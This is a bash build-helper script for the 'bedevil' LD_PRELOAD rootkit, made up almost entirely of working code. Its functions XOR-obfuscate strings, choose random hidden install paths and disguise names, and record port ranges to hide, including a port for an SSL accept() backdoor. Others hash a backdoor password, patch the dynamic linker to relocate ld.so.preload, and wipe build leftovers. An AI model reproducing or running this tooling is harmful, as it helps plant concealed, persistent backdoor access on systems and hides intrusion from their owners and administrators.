wecho() { printf " \e[33m[!]\e[0m $1\n"; }
eecho() { printf " \e[31m[!]\e[0m $1\n"; }
secho() { printf " \e[32m[+]\e[0m $1\n"; }
necho() { printf " [..] $1\n"; }

default_depth=2
script_root="$(cd "$(dirname "${BASH_SOURCE[0]}")" >/dev/null 2>&1 && pwd)"
get_rand_path() { echo -n "$($script_root/get_rand_path.sh $default_depth)/.$RANDOM"; }
random() { echo -n "`cat /dev/urandom | tr -dc $1 | fold -w $2 | head -n 1`"; }
lib_size() { echo -n "Rootkit compiled. ($BDVLSO.$1 - `ls -lhN $BDVLSO.$1 | awk '{print $5}'`)"; }
read_cfg() { cat $1 | grep -o '^[^#]*'; }

asc() { printf '%d' "'$1"; }
xor(){
    local din ptr dout val1
    din="$1"
    for (( ptr=0; ptr<${#din}; ptr++ )); do
        val1=$(asc "${din:$ptr:1}")
        dout+=$(printf '\\\\x%02x' "$((val1 ^ $XKEY))")
    done
    printf '%s' "$dout"
}

find_header_paths(){
    [ ! -d $NEW_MDIR ] && { eecho "$NEW_MDIR does not exist, can't find header paths"; exit; }
    local ret symbol_includes \
          include_path toggle_name

    symbol_includes="`cat $NEW_MDIR/includes.h | grep '.*\.h'`"
    while read -r line; do
        include_path="$NEW_MDIR/`echo -n "$line" | awk -F'"' '{print $2}'`"
        toggle_name="`cut_toggle_str "$line"`"
        [ "$toggle_name" == "(skip)" ] && continue
        [ -f $include_path ] && ret+=($include_path)
    done <<< "$symbol_includes"
    echo -n "${ret[*]}"
}

find_var_placeholders(){
    local headers current_var \
          header_path header_vars \
          vars
    headers=(`find_header_paths`)
    for w in ${headers[@]}; do
        header_path=$w
        header_vars=("`cat $header_path | grep '??'`")

        for var in ${header_vars[@]}; do
            current_var=`echo $var | grep "??"`
            [ -z $current_var ] && continue
            vars+=($current_var)
        done
    done

    echo -n "${vars[*]}"
}

get_header_dirs(){
    local header_locations header_dirs
    header_locations=(`find_header_paths`)
    for header in ${header_locations[@]}; do header_dirs+=("`dirname $header`"); done
    echo -n "${header_dirs[*]}"
}

find_char_arrays(){
    local arrays_locations header_dirs
    header_dirs=(`get_header_dirs`)

    for dir in ${header_dirs[@]}; do
        local arrays_path=$dir/char_arrays
        [[ "${arrays_locations[*]}" == *"$arrays_path"* ]] && continue
        [ ! -f $arrays_path ] && continue
        arrays_locations+=($arrays_path)
    done

    echo -n "${arrays_locations[*]}"
}

build_bdvlc(){
    [ ! -d $NEW_MDIR ] && { eecho "$NEW_MDIR does not exist, can't build bedevil.c"; exit; }
    
    local bdvlc="#define _GNU_SOURCE\n"
    bdvlc+="#include \"toggles.h\"\n"
    bdvlc+="#include \"stdincludes.h\"\n"
    bdvlc+="#include \"includes.h\"\n"
    bdvlc+="#include \"prehook.c\"\n"
    
    printf "$bdvlc" > $NEW_MDIR/bedevil.c
}

get_hide_ports(){
    necho "Getting hidden port ranges"

    for i in ${!range_hide_ports[@]}; do
        local tmp+="${range_hide_ports[i]}-"
        if (( $i % 2 )); then
            HIDE_PORTS+=("${tmp::-1}")
            unset tmp
        fi
    done

    for port in ${HIDE_PORTS[@]}; do echo "$port" >> $NEW_MDIR/hide_ports; done
    [ `toggle_enabled USE_ACCEPT_BD` == "true" ] && \
        [ `toggle_enabled ACCEPT_USE_SSL` == "true" ] && \
            echo "$((( ACCEPT_PORT + 1 )))" >> $NEW_MDIR/hide_ports
}

crypt_password(){ # if we can use python3, use it. if not, use openssl.
    [ -f `which python3 2>/dev/null || echo "no"` ] && { echo -n `python3 -c "import crypt; print(crypt.crypt(\"$1\"))"`; return; }
    echo -n "`openssl passwd -6 -salt `random 'A-Za-z0-9' 16` $1`"
}

patch_libdl(){
    necho "Patching dynamic linker libraries"
    LDSO_PRELOAD="`etc/patch_libdl.sh -op | tail -n 1`"
    secho "New ld.so.preload location: $LDSO_PRELOAD"
}

get_rand_name(){
    local names name name_length
    names=(`cat $script_root/names.txt | grep -o '^[^#]*'`)
    name_length=6

    name=${names[$RANDOM % ${#names[@]}]}
    while [ ${#name} -gt $name_length ]; do name=${name::-1}; done
    while [ ${#name} -lt $name_length ]; do name+="`random 'a-z' 1`"; done

    echo "$name"
}

cleanup_bdvl() { secho "Cleaning up local mess"; rm -rf $NEW_MDIR *.so.*; }